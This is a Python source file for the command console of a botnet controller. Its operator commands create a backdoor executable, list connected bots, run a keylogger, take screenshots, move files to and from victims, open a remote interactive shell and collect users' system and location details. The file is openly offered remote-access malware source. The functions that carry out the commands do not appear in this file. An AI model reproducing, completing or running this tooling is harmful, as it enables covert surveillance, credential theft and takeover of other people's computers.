# Date: 09/30/2017
# Author: Ethical-H4CK3R
# Description: Main Console

import os
import time
import json

from cmd2 import Cmd
from subprocess import Popen

class MainController(Cmd):
 ''' Control the main program '''

 def __init__(self):
  Cmd.__init__(self)

  self.colors = {
   'red': '\033[31m',
   'blue': '\033[34m',
   'white': '\033[0m',
   'green': '\033[32m',
   'yellow': '\033[33m'
   }

  self.debug = True
  self.ruler = '-'
  self.default_to_shell = True
  self.doc_header = '\n{0}Possible Commands {2}({2}type {1}help <{2}command{1}>{2})'.\
  format(self.colors['blue'], self.colors['yellow'], self.colors['white'])
  self.intro = '\n\ttype {}help{} for help\n'.\
  format(self.colors['yellow'], self.colors['white'])

  Popen('clear'.split()).wait()
  if not os.path.exists('/tmp/msg'):
   with open('/tmp/msg','w') as f:pass
   print '\n[-] Enter help for help\n[-] Enter help [CMD_NAME] for more detail'''

 def _help_menu(self):
  """"Show a list of commands which help can be displayed for.
  """
  ignore = ['shell', '_relative_load', 'cmdenvironment', 'help', 'history', 'load',
            'edit', 'py', 'pyscript', 'set', 'show', 'save', 'shortcuts', 'run']

  # get a list of all method names
  names = self.get_names()

  # remove any command names which are explicitly excluded from the help menu
  for name in self.exclude_from_help:
   names.remove(name)

  cmds_doc = []
  help_dict = {}
  for name in names:
   if name[:5] == 'help_':
    help_dict[name[5:]] = 1

  names.sort()
  prevname = ''

  for name in names:
   if name[:3] == 'do_':
    if name == prevname:
     continue

    prevname = name
    command = name[3:]

    if command in ignore:
     continue

    if command in help_dict:
     cmds_doc.append(command)
     del help_dict[command]
    elif getattr(self, name).__doc__:
     cmds_doc.append(command)
    else:pass

  self.print_topics(self.doc_header, cmds_doc, 15, 80)

 def print_topics(self, header, cmds, cmdlen, maxcol):
  if cmds:
   self.stdout.write("%s\n"%str(header))
   if self.ruler:
    self.stdout.write("+%s+\n"%str(self.ruler * (len(header))))
   self.columnize(cmds, maxcol-1)
   self.stdout.write("\n")

 # Basic commands
 def do_setip(self, arg=None):
  ''' \n\tDescription: Assign the IP to host the server\n\tUsage: setip [IP]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkIP(arg[0]):return
  self.ip = arg[0]

 def do_setport(self, arg=None):
  ''' \n\tDescription: Assign the port to host the server\n\tUsage: setport [PORT]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkPORT(arg[0]):return
  self.port = eval(arg[0])

 def do_create(self, arg=None):
  ''' \n\tDescription: Create a backdoor\n\tUsage: create [IP] [PORT] [NAME]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 3):return
  if not self.checkIP(arg[0]):return
  if not self.checkPORT(arg[1]):return
  if not self.checkName(arg[2]):return
  self.createBot(arg[0], arg[1], os.path.splitext(arg[2])[0])
  Popen('clear'.split()).wait()
  print '[{}+{}] Backdoor Created Successfully'.format(self.colors['green'], self.colors['white']) if \
  os.path.exists(os.path.splitext(arg[2])[0]+'.exe') else '[-] Error: Backdoor Creation Failed'

 def do_remove(self, arg=None):
  ''' \n\tDescription: Remove a bot from botnet (Permanently)\n\tUsage: remove [ID]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  bot = self.botnet[eval(arg[0])-1]
  self.sendData(bot.session, self.struct(1))
  self.killBot(bot)

 def do_chrome(self, arg=None):
  ''' \n\tDescription: Launch chrome & open unlimited amount of tabs\n\tUsage: chrome [ID] [URL1] [URL2] [URLn]\n '''
  arg = arg.split()
  if not self.checkID(arg[0]):return
  if not self.checkArg(arg, min=2):return
  self.sendData(self.botnet[eval(arg[0])-1].session, self.struct(97, arg[1:]))

 def do_shutdown(self, arg=None):
  ''' \n\tDescription: Shutdown a bot\n\tUsage: shutdown [ID]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  bot = self.botnet[eval(arg[0])-1]
  self.sendData(bot.session, self.struct(96))
  self.killBot(bot)

 # Botnet commands
 def do_botnet(self, arg=None):
  ''' \n\tDescription: Display a list of connected bots\n\tUsage: botnet\n '''
  self.display()

 # Bot commands
 def do_kill(self, arg=None):
  ''' \n\tDescription: Kill the connection to a bot (Connects back a later time)\n\tUsage: kill [ID]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  bot = self.botnet[eval(arg[0])-1]
  self.sendData(bot.session, self.struct(0))
  self.killBot(bot)

 def do_reset(self, arg=None):
  ''' \n\tDescription: Reset the connection to a bot\n\tUsage: reset [ID]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  self.killBot(self.botnet[eval(arg[0])-1])

 def do_keylogger(self, arg=None):
  ''' \n\tDescription: Keylogger\n\tUsage: keylogger [ID] [START|STOP|DUMP|REMOVE]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 2):return
  if not self.checkID(arg[0]):return
  self.keylogger(arg[0], arg[1])

 def do_getinfo(self, arg=None):
  ''' \n\tDescription: Display the personal information of a bot\n\tUsage: getinfo [ID]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  self.system(arg[0]) # sys
  self.location(arg[0]) # geo

 def do_upload(self, arg=None):
  ''' \n\tDescription: Upload a file to a bot (Uploaded to C:\System)\n\tUsage: upload [ID] [PATH]\n '''
  arg = arg.split()
  if not self.checkArg(arg, min=2):return
  if not self.checkID(arg[0]):return
  self.upload(self.botnet[eval(arg[0])-1], ' '.join(arg[1:]))

 def do_download(self, arg=None):
  ''' \n\tDescription: Download a file from a bot\n\tUsage: download [ID] [PATH]\n '''
  arg = arg.split()
  if not self.checkArg(arg, min=2):return
  if not self.checkID(arg[0]):return
  self.download(self.botnet[eval(arg[0])-1], ' '.join(arg[1:]))

 def do_screenshot(self, arg=None):
  ''' \n\tDescription: Screenshot of a bot\n\tUsage: screenshot [ID]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  self.download(self.botnet[eval(arg[0])-1], num=100)

 def do_shell(self, arg=None):
  ''' \n\tDescription: Open an interactive shell\n\tUsage: shell [ID]\n '''
  arg = arg.split()
  if not self.checkArg(arg, 1):return
  if not self.checkID(arg[0]):return
  bot = self.botnet[eval(arg[0])-1]
  try:
   self.sendData(bot.session, self.struct(101))
   host = bot.system['Username'] if bot.system else 'UNKNOWN'
   ip = bot.location['Ip'] if bot.location else 'UNKNOWN'
   host = host if host else 'UNKNOWN'
   ip = ip if ip else 'UNKNOWN'
   self.shell(bot, self.getprompt(ip, host, True))
  except:pass

 # Server commands
 def do_server_start(self, arg=None):
  ''' \n\tDescription: Start the server\n\tUsage: server_start\n '''
  self.startServer()

 def do_server_stop(self, arg=None):
  ''' \n\tDescription: Stop the server\n\tUsage: server_stop\n '''
  self.stopServer()

 def do_server_restart(self, arg=None):
  ''' \n\tDescription: Restart the server\n\tUsage: server_restart\n '''
  self.restartServer()

 def do_server_info(self, arg=None):
  ''' \n\tDescription: Display information about the server\n\tUsage: server_status\n '''
  running = '\n[-] Last Active On: {}:{}'.format(self.activeIP, self.activePort)
  connections = '\n[-] Connections: {}'.format(len(self.botnet))

  print '\n[-] Port: {}\n[-] IP: {}\n[-] Active: {}{}{}\n\
        '.format(self.port,
                  self.ip,
                   self.server_status,
                     connections if self.server_status else '',
                      running if self.server_status else '')
